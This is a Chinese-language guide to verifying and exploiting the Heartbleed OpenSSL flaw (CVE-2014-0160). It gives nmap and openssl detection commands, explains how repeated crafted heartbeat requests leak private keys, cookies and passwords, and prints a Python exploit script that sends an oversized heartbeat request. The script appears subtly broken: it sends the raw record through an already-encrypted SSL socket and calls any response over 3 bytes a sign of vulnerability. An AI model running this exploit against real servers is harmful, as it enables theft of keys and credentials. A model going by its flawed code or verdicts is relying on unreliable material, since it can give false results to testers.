验证漏洞存在方法
    - 使用nmap脚本检测：nmap -p 443 --script ssl-heartbleed <target>
    - 使用openssl命令手动测试：echo -e "quit\\n" | openssl s_client -connect <target>:443 -tlsextdebug 2>&1 | grep 'heartbeat'
    - 使用专门的Heartbleed检测工具如ssltest.py

漏洞利用方法
    - Heartbleed漏洞允许攻击者通过发送特制的Heartbeat请求包，读取服务器内存中的敏感信息
    - 攻击者可以反复发送恶意请求，每次读取最多64KB的内存数据
    - 泄露的信息可能包括：私钥、会话Cookie、用户密码等敏感数据
    
PoC示例：
```python
#!/usr/bin/python
# Heartbleed PoC (CVE-2014-0160)
import socket
import ssl
import struct
import sys

def heartbleed_poc(host, port=443):
    try:
        # 创建SSL连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s = ssl.wrap_socket(s)
        
        # 发送Heartbeat请求
        heartbeat = (
            b'\x18' +  # Content Type: Heartbeat (24)
            b'\x03\x02' +  # TLS version 1.1
            struct.pack('>H', 0x0003) +  # Length
            b'\x01' +  # Heartbeat type: request
            struct.pack('>H', 0x4000)  # Payload length (16384)
        )
        
        s.send(heartbeat)
        
        # 接收响应
        response = s.recv(0x4000 + 5)
        
        if len(response) > 3:
            print(f"[+] {host}:{port} is VULNERABLE to Heartbleed!")
            print(f"[+] Response length: {len(response)} bytes")
            return True
        else:
            print(f"[-] {host}:{port} is NOT vulnerable")
            return False
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python heartbleed_poc.py <host> [port]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    heartbleed_poc(host, port)
```

注意事项：
1. 此漏洞影响OpenSSL 1.0.1到1.0.1f版本
2. 修复方法：升级到OpenSSL 1.0.1g或更高版本
3. 漏洞利用可能导致目标系统内存泄露，建议仅在授权测试环境中使用
4. 实际利用可能需要多次尝试以获取有用信息
